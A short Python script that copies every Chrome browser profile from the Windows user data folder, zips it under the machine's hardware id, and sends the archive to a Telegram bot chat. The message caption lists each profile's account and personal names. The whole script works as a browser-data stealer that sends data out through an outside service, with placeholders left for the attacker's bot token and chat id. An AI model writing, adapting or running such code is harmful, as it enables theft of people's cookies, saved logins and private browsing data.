import asyncio
from telegram import Bot

import shutil
import tempfile
import os
import uuid

from ChromeReader import Profiler

BOT_TOKEN: str = "<BOT TOKEN>"
USER_ID: int = "<YOUR USER ID (int)>"

async def main():
    print("Loading bot...")
    bot = Bot(token=BOT_TOKEN)
    
    print("Creating temp directory...")
    with tempfile.TemporaryDirectory() as temp_path:
        path = os.path.join(temp_path, str(uuid.getnode()))
        print("Saving profiles...")
        profiler = Profiler(os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data'))
        profiler.save_profiles(path)
        print("Making archive...")
        zip_path = shutil.make_archive(path, "zip", path)
        
        print("Sending archive...")
        caption = f"{len(profiler.profiles)} profiles found:\n\n" + "\n\n".join([f"• {profile.name} ({profile.profile_name})\n{profile.user_name}\nGiven name: {profile.gaia_given_name}\nName: {profile.gaia_name}\nActive time: {profile.active_time_timedelta}" for profile in profiler.profiles])
        with open(zip_path, "rb") as zip:
            await bot.send_document(chat_id=USER_ID, document=zip, caption=caption)
        
if __name__ == "__main__":
    # Run
    asyncio.run(main())